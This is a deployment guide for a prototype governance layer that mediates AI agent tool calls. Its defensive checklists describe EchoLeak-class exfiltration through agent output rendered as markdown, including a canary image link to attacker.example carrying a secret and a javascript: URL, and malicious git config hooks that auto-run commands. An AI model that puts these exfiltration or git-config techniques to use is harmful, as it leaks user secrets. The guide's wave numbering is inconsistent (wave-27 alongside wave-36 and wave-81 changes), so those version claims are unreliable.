# Deployment Guide — agent-governance-layer

**Status:** Wave-27 refresh, 2026-09-22. Prototype-grade, not production.
**Supersedes:** the wave-23 draft (key deltas since: D1 bridges landed
(`gov/bridges/` AGT-Python shim), approval-web bridge badges + framing
mediation + queue-health panel, key-ceremony runbook written
(`workstreams/kms/CEREMONY_RUNBOOK.md`), D2 neutral-benchmark evidence
(ours 14/18 vs AGT 3/18), F82/F83/F86/F87/F88/F90/F91/F92/F93/F94/F101
closed, F95–F100 open, F72/F83 fixes landed with closure unrecorded).

> **Honesty header (B6 bar).** This system is a research prototype with an
> honestly-tested enforcement core. This guide tells you how to *run* it; it
> does not pretend the run is production. For what is still missing, see
> `docs/READINESS_GAPS.md`.

---

## 1. Architecture snapshot (what you are deploying)

| Layer | Implementation | Notes |
|---|---|---|
| Tool executor | `gov/executor.py` | Every agent action flows through identity → role allowlist → DLP → rate/volume guards → **fail-closed policy** → fail-closed logging → provenance/taint → execution. Executor-level controls S1–S5: reversibility/impact ratings (`K-041`), hard token/spend budgets (`K-018`), total-step budget (`K-045`), cross-run per-principal velocity ledger (`K-052`). All simulated tools; no real network side effects outside the run dir. |
| Fail-closed policy engine | `gov/policy.py` | YAML policies (`policies/default.yaml`); deny priority; any evaluation failure denies. |
| Human approval queue | `gov/approvals.py` | File-based (`approvals.jsonl` in the run dir). Integrity binding: HMAC-SHA256 `args_digest` over queued redacted args + policy id, key epoch bound in; policy-hash pinning; TTL (default 24 h); separation of duties (requester cannot decide own record). |
| D1-core approval invariants | `workstreams/architect/D1_CORE_SPEC.md`, `gov/approvals.py` | Delegation controls S1–S7 (never-back-to-requester, no loops, no self-delegation, hop cap), quorum controls S8–S15/S18 (deny veto is terminal, no single-decider bypass T9, eligibility snapshot), bridge invariants S16–S17 (`bridge_expired` marker MAC-bound; late decisions are audit-only, never executable — T12), interaction scenarios S19–S20 (break-glass cannot bypass M-of-N). |
| Approval web UI | `gov/approval_web.py` | **Localhost operator console, stdlib only.** Bearer-token in memory; no SSO/OIDC/mTLS; in-memory sessions (no session persistence, no cross-process sharing); binds 127.0.0.1 by default and **refuses any non-localhost bind without TLS + real auth in front**. Wave-25/27 additions: bridge badges + foreign-bridge panels (`bridge_expired` records render unmistakably and can never execute, T12), framing-mediation quarantine zone (K-028), and a queue-health advisory panel + cluster-member banners surfacing the F4 fatigue-anomaly detector (read-only, advisory only). |
| D1 bridges | `gov/bridges/` | Pluggable seam into competitors' governors (component posture, A12): `core.py` (BridgeAdapter ABC + fail-safe helpers), `agt.py` (in-process `DurableQueueApprovalHandler` for AGT-Python `CallbackApproval`; 240s bounded wait strictly under AGT's 5-min default; `bridge_expired` marker MAC-bound; late decisions audit-only, never executable). AGT .NET `WebhookApprover` ingress and the AWS AgentCore approval-event *producer* bridge are **sequenced later** (protocol risk; the docs state this honestly — do not claim they exist). |
| Audit log | `gov/log.py` | Append-only, HMAC-SHA256 authenticated, hash-chained. Format-2 checkpoints add a Merkle root over entries 1..seq plus **Ed25519 signature(s)** over the checkpoint body (`gov/ed25519.py`, `gov/signing.py`, `gov/merkle.py`). |
| KMS key lifecycle | `gov/kms.py` | Envelope encryption for the log's HMAC data keys: epoch data keys generated locally, stored only *wrapped* under a KMS master key; plaintext exists only in memory after explicit `unwrap`. **Fail-closed: every KMS failure raises `KmsError`; there is no fallback key and no dev-key fallback on this path, ever.** `FakeKmsProvider` is a test double refused unconditionally from operator config (the `GOV_DEV_KEYS` opt-in was deleted in wave-81; tests construct it directly in code). Key-id binding on unwrap (impersonator vector hardened). v1 plaintext `KeyRing` (`gov/keys.py`) remains the no-KMS/air-gapped backend, documented as weaker custody. |
| Threshold custody | `gov/custody.py` | A5 threshold checkpoint signing: `SignerShareStore` wraps each checkpoint signer's Ed25519 seed under a KMS data key (separate artifact from log HMAC keys; role separation). Offline root key lives only on the ceremony machine. Ceremonies (genesis, rotate-share, rotate-roster, rewrap) recorded to a hash-chained transcript with root-signed tip manifests (F78). **The ceremony runbook now exists** (`workstreams/kms/CEREMONY_RUNBOOK.md`, written wave-26) — but no live ceremony has been run: threshold signing is procedure-written, ceremony-unpracticed. |
| Egress ledger | `gov/egress_ledger.py` | Per-principal, tamper-evident, cross-run record of outbound API activity; fragment-shape (F13) and same-key-set (F14) heuristics for campaign detection. Queue-only, fail-safe — a signal, not a verdict. |
| Sandbox | `gov/sandbox.py` | Real execution backend: `shell=False` argv vectors, fresh temp cwd, scrubbed env, process-group SIGKILL on timeout, bounded output drain, POSIX rlimits, netns/pidns when available, pivot_root + UID/GID drop + **seccomp-bpf allowlist** (`DEFAULT_SECCOMP_ALLOW`) behind env flags, with **fail-closed strict mode** (`GOV_SANDBOX_STRICT=1` / `require_pidns=True`, `require_netns=True`). Per-call honest isolation reporting (`network_isolated`, `pid_isolated`). **Honest limits:** not a chroot (filesystem authority is parent-side); defense-in-depth, not a container boundary against arbitrary hostile native code. **Filtered-egress / destination-allowlist mode productized** (`gov/egress_launcher.py`; finding F81 CLOSED — validated by lab 2026-09-23): the launcher wraps execution behind the wall by default; fail-closed (wall unverifiable → launch refused, not degraded); component pinning (iptables/nft ruleset, proxy config, DNS filter config, allowlist) with pinned digests re-verified at startup. Residual threat model: `docs/egress_wall_threat_model.md`. |

**Strategic positioning (D1–D5, `research/competitive-deep-dive.md` §0,
`workstreams/architect/STRATEGY_ROADMAP.md`):** this is a component — the
durable approval queue + enforcement-testing layer that plugs into Microsoft's
Agent Governance Toolkit and AWS Bedrock AgentCore — **not a replacement** for
them. We do not differentiate on policy engines, audit crypto, sandboxing,
framework adapters, or compliance mappings; those are table stakes.

---

## 2. Prerequisites

- Linux (namespaces, seccomp-bpf, `pivot_root` behavior are Linux-specific;
  the sandbox degrades honestly elsewhere but is not deployment-grade off Linux).
- Python 3.12+, stdlib only (`pyproject.toml`; tests run via
  `TMPDIR=/tmp/gov-run python3 tests/run_tests.py` — no network installs; note
  `tests/run_tests.py` itself once resolved `pip install pyyaml` unpinned: see
  F75 in `docs/READINESS_GAPS.md`).
- Dependencies are pinned in `requirements.lock` (exact versions + sha256
  hashes, F75). Venv workflow — fresh venv:
  `python3 -m venv .venv && .venv/bin/python -m pip install --require-hashes -r requirements.lock`;
  existing venv: `.venv/bin/python -m pip install --require-hashes -r requirements.lock`
  (re-pins drifted packages) then `.venv/bin/python -m gov.supplychain --audit`
  (fail-closed allowlist check; `tests/run_tests.py` runs it automatically
  before test collection). Regenerate the lock with
  `.venv/bin/python -m gov.supplychain --regen-lock` ($0, PyPI JSON API).
- Kernel with `SECCOMP_MODE_FILTER`, `NO_NEW_PRIVS`, user namespaces enabled
  (`unshare(CLONE_NEWNET/CLONE_NEWPID)`) for the full sandbox posture.
- No paid APIs, no cloud required for the core; **a real KMS is required for
  production-grade key custody** (below).

---

## 3. Key ceremony & KMS configuration

### 3.1 Key-ceremony runbook
- The code (`gov/custody.py`, `gov/signing.py`) documents ceremonies and
  points to **`workstreams/kms/CEREMONY_RUNBOOK.md`** — **written in
  wave-26** (genesis roster, root-key media handling, dual control,
  rotation, break-glass root rotation, out-of-band root-pub
  distribution). Manual (air-gapped) custody has no code path by design;
  the ceremony functions operate on public keys in the roster.
- **Action before any production-like deployment:** run the ceremonies
  on the offline machine per the runbook. Until a genesis ceremony is
  actually executed and its transcript verified, threshold signing is
  not operationally real: procedure-written, ceremony-unpracticed.

### 3.2 KMS provider setup
- Production: provide a `KmsProvider` per the AWS KMS / GCP KMS / Azure Key
  Vault envelope contract (`gov/kms.py` docstring, §2/§9 of `DESIGN.md` —
  see file if present). Always pass explicit `KeyId` on unwrap (key-id binding
  is a security property, not a convenience).
- The v2 envelope keyring file holds wrapped blobs + metadata only (atomic,
  0600). File theft yields no key material.
- Epoch rotation: `EnvelopeKeyRing` supports rotation with lazy
  materialization of retired epochs; **retired seeds are retained**
  (old checkpoints must stay verifiable). `rewrap` rotates the KMS master key
  without touching signing keys (transcript entry only).
- Air-gapped/no-KMS: v1 plaintext `KeyRing` (`gov/keys.py`) is the fallback —
  **documented weaker custody; a production deployment must not rely on it.**

---

## 4. Configuration reference (environment)

Only values that reach a production operator are described; `*_CANARY` vars
and `GOV_INCIDENT_PROBE_SECRET` are red-team test scaffolding.

| Variable | Purpose | Default / effect |
|---|---|---|
| `GOV_DEV_KEYS` | **Deleted in wave-81.** This dev-key gate no longer exists: the fake KMS is refused unconditionally from operator config and the publicly-known development HMAC key is gone from `gov/`. Any lingering reference to the variable is inert. | n/a (removed) |
| `GOV_LOG_KEY` | Base64 HMAC key for the action log (STRICT resolution per `gov/log.py` R6c; unset → refuse to start). | **must be set in production** |
| `GOV_LOG_KEY_EPOCH` | Names the key version; bound into every MAC. | optional |
| `GOV_LOG_KEY_ARCHIVE` | Retired keys for cross-epoch verification. | retained by design |
| `GOV_POLICY_HASH` | Pins the expected policy hash; engine refuses a different policy. | optional but recommended |
| `GOV_RUN_ROOT` | Root for run directories (logs, queue, sandbox roots). | unset → local default |
| `GOV_SANDBOX_BACKEND` | Enable the real sandboxed execution backend. | `=1` to enable |
| `GOV_SANDBOX_STRICT` | **Fail-closed strict mode**: additionally require the always-on net/pid namespace layers (`require_pidns`/`require_netns`); child is stopped before exec if they cannot be established. **Enable for any hostile-code execution.** | `=1` recommended |
| `GOV_SANDBOX_SECCOMP` / `GOV_SANDBOX_PIVOT` / `GOV_SANDBOX_PRIVDROP` / `GOV_SANDBOX_NETNS` / `GOV_SANDBOX_PIDNS` | Harden the hardened layers individually (seccomp-bpf, pivot_root, UID/GID drop, net/pid namespaces). | `=1` each; audit after changes |
| `GOV_WORKSTREAMS` | Working-copy stream selector (test scaffolding). | test use |

Run the test suite after any sandbox change with seccomp on:
`python -m gov.sandbox --audit-seccomp` (needs `strace`) after modifying
`DEFAULT_SECCOMP_ALLOW`, then `TMPDIR=/tmp/gov-run python3 tests/run_tests.py`.

---

## 5. Operating procedures

### 5.1 Starting a governed run
1. Set `GOV_LOG_KEY` (+ `GOV_LOG_KEY_EPOCH`) from your secrets store; **there are no dev-key shortcuts** — the factory refuses the fake KMS provider unconditionally and wave-81 deleted the dev opt-in, which is the safety property working.
2. Set `GOV_SANDBOX_BACKEND=1 GOV_SANDBOX_STRICT=1` (plus the individual
   `GOV_SANDBOX_*` hardening flags) for tool execution with hostile content.
3. Launch the approval console bound to **127.0.0.1 only**
   (`python -m gov.approve` CLI or `gov/approval_web.py`). Non-localhost binds
   are unsupported without TLS + real auth in front — the module prints the
   warning itself.
4. Verify the suite is green before deploying a changed tree:
   `TMPDIR=/tmp/gov-run python3 tests/run_tests.py` (red halts feature work).

### 5.2 Approval workflow
- Pending records live in the run dir's `approvals.jsonl`; decide via CLI or
  the web console. Delegation/quorum/bridge rules are enforced by
  `gov/approvals.py` (D1-core invariants T1–T13); the console cannot bypass them.
- The console's list page renders a **queue-health advisory panel** (F4
  fatigue-burst / rate-spike / unusual-tool-mix clusters, read-only,
  advisory-only) and detail pages banner cluster membership — use them
  to pace decisions; they never auto-approve or auto-deny.
- Expired bridge waits (`mark_bridge_expired`) make records audit-only —
  **late decisions can never execute** (T12). This is by design.
- Bridge-sourced records (`bridge:<id>` badge) are executed by the
  *foreign* runtime, never by our executor — the console shows them for
  the human decision only. AGT .NET / AWS bridges are not yet built;
  only the AGT-Python in-process shim exists.
- Break-glass (`break_glass`) requires the provisioned session identity (F55)
  and cannot bypass M-of-N quorum (S19).

### 5.3 Key rotation & log maintenance
- Rotate HMAC epochs via the keyring API; keep `GOV_LOG_KEY_ARCHIVE` populated
  (cross-epoch verification). Never delete retired seeds.
- Verify chain integrity: `python -m gov.verify` (see `gov/verify.py`);
  checkpoint verification covers Merkle roots + Ed25519 signatures; ceremony
  transcript verification via `gov/custody.py` `verify_ceremony_chain` /
  `verify_transcript_tip`.
- Sandbox cleanup: per-call temp dirs are removed after execution; use
  `GOV_KEEP_CELL_DIRS=1` only for debugging (retains cell dirs).

### 5.4 Monitoring (current reality)
- The system emits the tamper-evident action log and audit reports
  (`reports/`); there is **no built-in metrics/health-check/alerting
  pipeline**. Monitoring = tailing the action log + running `gov/verify.py`
  on a schedule (cron/systemd timer — operator-provided). This is a gap; see
  `docs/READINESS_GAPS.md`.

### 5.5 Retention
- **Enforced retention is not built** (strategy decision D4 in
  `workstreams/architect/STRATEGY_ROADMAP.md` §4 — `retention:` policy section
  with `min/max_retention_days` is planned, not implemented). Today: retention
  is whatever your backup/archival policy does with the run dirs. Treat log
  dirs as append-only evidence stores; do not prune keys or checkpoints.

### 5.6 Output rendering — P13 (EchoLeak-class exfiltration via active renderers)

**Why this section exists.** The governance layer constrains the
*payload* side: DLP, read-before-send correlation, taint, and the
egress byte budget keep sensitive bytes from reaching agent output
(P1/P4 close-outs in `workstreams/evals/INCIDENT_COVERAGE.md`). It
does **not** control the *renderer* that displays that output to a
user. If you render agent output in an active renderer (markdown with
image autoload, HTML email, chat bubbles with link previews), an
attacker who got a URL into the output can exfiltrate by getting the
*renderer* to fetch it — the EchoLeak shape. That fetch happens in the
user's browser/mail client, outside every control in this repo. The
mitigation is deployment-side output filtering. Treat the checklist
below as mandatory for any deployment that renders agent output.

**What to filter (concrete).** Before agent-controlled text reaches
any renderer:

1. **Markdown image/dangling-reference URLs.** Rewrite or drop
   `![alt](url)` and `[text](url)` whose host is not on your
   image/link allowlist — or route all of them through an
   image/link proxy you operate (the proxy fetches; the client never
   touches the attacker host). At minimum, strip `![](...)` with
   non-allowlisted hosts entirely.
2. **Raw HTML in markdown.** Disable raw HTML in your markdown
   pipeline (`html: false` in markdown-it / marked; `ALLOWED_TAGS =
   []` if you must allow a subset, see DOMPurify below).
3. **Autolinked bare URLs and link previews.** Disable linkify
   (`linkify: false`) or proxy unfurl/preview fetches server-side
   against the same allowlist — chat link previews are fetches.
4. **Dangerous schemes.** Reject `javascript:`, `data:`, `vbscript:`,
   `file:` URIs in every URL position (images, links, embeds), even
   on allowlisted hosts (they can hide in path/query).
5. **HTML email rendering.** If agent output goes into email, send
   `multipart/alternative` with a plaintext part and sanitize the
   HTML part with the DOMPurify config below; never embed
   agent-controlled URLs in `<img src>` — use the proxy.

**Reference configuration (adapt host lists to your deployment).**

Content-Security-Policy on every page that renders agent output:

```
Content-Security-Policy: default-src 'self'; img-src 'self' https://img-proxy.internal.example; connect-src 'self'; script-src 'self'; object-src 'none'; base-uri 'self'; form-action 'self'
```

DOMPurify (client-side last line of defense — never the only one):

```js
DOMPurify.sanitize(dirty, {
  ALLOWED_TAGS: ['p','b','i','code','pre','ul','ol','li','a','br'],
  ALLOWED_ATTR: ['href'],
  ALLOWED_URI_REGEXP: /^(https?:)?\/\/(img-proxy\.internal\.example|docs\.internal\.example)(\/|$)/i,
  FORBID_TAGS: ['img','style','form','input','button','iframe','object','embed'],
});
```

markdown-it (server-side, before DOMPurify):

```js
const md = require('markdown-it')({ html: false, linkify: false, typographer: false });
```

**Reference implementation (repo-pinned, wave-36).**
`gov/output_filter.py` is the executable form of the filter list
above — a deterministic, stdlib-only sanitizer (`sanitize()` /
`contains_active_content()`) for agent-controlled text before it
reaches any renderer. Use it as the server-side pre-filter in your
pipeline (Python) or port its rules 1:1; its behavior is pinned by
`tests/test_w36_output_filter_p13.py` and the registered probes
`redteam.incident.p13.echoleak_reference_filter_neutralizes` /
`..._filter_allowlist_honored`. It does NOT replace the CSP /
DOMPurify / markdown-it layers — it is the pre-render neutralization
pass, and it cannot configure your renderer (bare-URL link previews
stay a renderer setting per item 3 above).

**Verification checklist (run before you ship rendering).**
- [ ] Feed the renderer the EchoLeak canary: agent output containing
  `![x](https://attacker.example/pixel?c=<secret>)` and
  `[x](javascript:alert(1))` — confirm no request leaves the client
  to `attacker.example` (browser devtools / proxy logs) and the
  `javascript:` link is inert.
- [ ] Confirm `<img>` tags cannot be produced by any agent-output
  path (grep the rendered DOM in a test harness, not just the config).
- [ ] Confirm the image proxy (if used) allowlists hosts and does not
  forward client cookies/credentials.
- [ ] Re-run the checklist after every renderer/markdown-library
  upgrade — upgrades re-enable features.

**Honest boundary.** This guidance cannot be verified by this repo's
test suite — the renderer is your code, not ours. P13 therefore stays
PARTIAL by design: payload side governed in-repo, renderer side
governed by this checklist in your deployment. If you skip this
section, you are shipping the EchoLeak vector.

---

### 5.7 Untrusted-repo git hygiene — GitSpawn class (no in-repo code path)

**Why this section exists.** GitSpawn (Manifold Security, disclosed
2026-09-01/02; CVE-2026-19592): a malicious `.git/config` in an
untrusted repo (`core.fsmonitor`, aliases, `core.hooksPath`)
auto-executes attacker commands when *tooling* performs routine git
operations on that repo — below the agent decision layer, possibly
before the sandbox boundary is established. Verified 2026-09-22:
nothing in this repo shells out to `git` (repo-wide grep over
`gov/`, `evals/`, `tests/`, `demo/`, `examples/`, `workstreams/` —
zero `git` subprocess invocations), so there is no in-repo code path
to fix and no finding was filed. The risk lives in YOUR harness and
operator tooling the moment it touches agent-supplied repos.

**Checklist (do all of these wherever your tooling runs git against a
repo the agent provided or fetched):**

- Treat repo intake as hostile: never run any git command inside an
  untrusted repo before sanitizing it. "Repo opened" is not a passive
  event.
- Sanitize repo-supplied `.git/config` on intake: strip or refuse
  `core.fsmonitor`, `core.hooksPath`, and all `alias.*` entries before
  the first git invocation. Prefer cloning with `--no-local` semantics
  into a fresh directory you own, then deleting attacker-controlled
  config.
- Force-untrust config at every git call site that can touch an
  untrusted repo: `-c core.fsmonitor=false`, `-c core.hooksPath=/dev/null`
  (or an empty dir you control), and never honor repo-supplied
  aliases (invoke `git --no-replace-objects` where aliasing matters).
  Set `GIT_CONFIG_NOSYSTEM=1` (and consider `GIT_CONFIG_GLOBAL=/dev/null`)
  so system/global config cannot re-enable execution primitives.
- Scope `safe.directory` explicitly to directories you provisioned;
  never add an attacker-influenced path.
- Run these git operations inside the same sandbox boundary as the
  agent (or a tighter one), never on the operator host before sandbox
  init. If a repo-config-sourced command must run at all, it runs
  sandboxed and produces an audit event.
- Keep this repo's invariant: if you ever add a `git` subprocess call
  site to this tree, it must go through a single hardened helper that
  applies the above, and the eval registry must gain a probe running a
  routine git op against an adversarial repo config (malicious
  `core.fsmonitor`) asserting no config-sourced command executes
  outside the sandbox or without an approval/audit event.

**Honest boundary.** Like §5.6, this guidance cannot be verified by
this repo's test suite — the git call sites are your tooling, not
ours. No finding was filed because there is no in-repo gap; if you
skip this section while running git on untrusted repos, you are
shipping the GitSpawn vector.

---

### 5.8 Harness-invoked primitives — platform egress + credential manifest

**Why this section exists.** Two of the strongest controls in this
repo are *harness-invoked primitives*, not automatic enforcement: a
deployment that never calls them gets none of their guarantees. This
is the documented integration shape (same as F55 session-identity
provisioning). If you build either of these features, you must route
through the primitive — building your own equivalent beside it voids
the guarantee.

**A. Harness-initiated collection / upload — `gov/platform_egress.py`
(F110, P15 ZCode-class).** This module is the ONLY sanctioned path
for harness code that collects workspace bytes and uploads them
(telemetry, indexing, diagnostics, support bundles). The product has
no collection feature; the primitive is a guardrail for code YOU
write.

- Construct `WorkspaceCollector` with a platform-held `consent_key`
  (≥16 bytes, from your KMS — never hardcoded, never agent-visible).
- Obtain consent via `issue_consent(log, key, scope, ttl)` — the
  token is HMAC-bound to issuance; the collector refuses
  hand-minted/tampered/wrong-key tokens. No token = no collection
  (fail-closed, default-off).
- Collection egress is policy-routed: the destination must be on the
  egress allowlist (`deny-platform-egress-unallowlisted`), and the
  audit log records `platform_egress_authorized` BEFORE the upload
  and `platform_egress_upload` after it (failed uploads record
  `platform_egress_upload_failed`).
- Archives require an encryption key: pass an explicit `cipher=`
  callable. There is NO production cipher in stdlib — the primitive
  fails closed rather than silently using the test-only
  `demonstration_cipher`. Plaintext is allowed ONLY with explicit
  `allow_plaintext=True`, which is recorded in the audit entry.
- **Do not** build a parallel uploader (requests.post of a tarball
  in your harness). If you do, the ZCode-class guarantee ("no silent
  collection") does not apply to it, and no test in this repo will
  catch it — the eval probes only exercise the primitive.

**B. Credential provisioning — `gov/credential_manifest.py` (F111,
P16 GTG-50020-class).** Before a run starts, declare EVERY
credential the agent can reach with `manifest.declare(path, owner,
scope, ttl)` — declaration asserts the file holds NO
production-shaped material (fail-closed on unreadable files). Then
call `manifest.verify_scope()` — it fail-closed the run if any
credential-shaped material exists at an UNDECLARED path, and
re-asserts the non-production assertion on declared paths (closes
the declare→swap→verify TOCTOU).

- Egress carrying a credential not bound to the provisioned session
  identity is denied + audited (`credential_identity_mismatch`).
  Credentials travel by `credential_id` reference, never by raw
  value — raw key bytes in tool args are denied by the DLP layer AND
  by `check_egress` (a self-asserted `credential_owner` does not
  override this).
- **Do not** provision production credentials to eval/sandbox runs
  (GTG-50020: "the eval pipeline ran with the prod key" is a
  real, industry-scale failure mode). Scope short-lived,
  non-production credentials per run.
- **Do not** skip `verify_scope()` because "declaration is enough"
  — undeclared paths are exactly where mounted secrets hide.

**Honest boundary.** The repo's suite and eval registry verify the
primitives themselves; they cannot verify that YOUR harness calls
them. If your harness collects workspaces or provisions credentials
without these two modules, say so in your own deployment review —
the guarantees in `evals/FINDINGS.md` (F110, F111) describe the
primitive, not your deployment.

---

## 6. Upgrade notes
- **v1 → v2 keyring:** envelope format v2 files are explicitly version-rejected
  by v1 parsers and vice versa (`gov/kms.py`); migrate by `activate()` +
  re-wrap, never by hand-editing.
- **Policy changes:** `policy_hash` pinning means a policy edit invalidates
  queued approvals' pin — drain the queue (or re-queue) before deploying a new
  policy; `GOV_POLICY_HASH` must be updated in lockstep.
- **Checkpoint format 2:** adds Merkle root + Ed25519 signature fields; old
  verifiers must be upgraded together with producers.
- **Seccomp allowlist changes:** any edit to `DEFAULT_SECCOMP_ALLOW` requires
  `python -m gov.sandbox --audit-seccomp` + full suite re-run (see §4).

---

## 7. What not to do
- There are no dev-key shortcuts to reach for: `GOV_DEV_KEYS` was deleted in wave-81 and there is no dev fallback.
- Do not bind the approval console beyond localhost without TLS + OIDC/mTLS.
- Do not run hostile code without `GOV_SANDBOX_STRICT=1` (fallback workers can
  signal the parent by explicit PID without the PID namespace — demonstrated
  in `gov/sandbox.py` docstring).
- Do not treat the egress ledger's F13/F14 signals as verdicts (heuristic,
  queue-only).
- Do not delete retired keys or old checkpoints — verification depends on them.
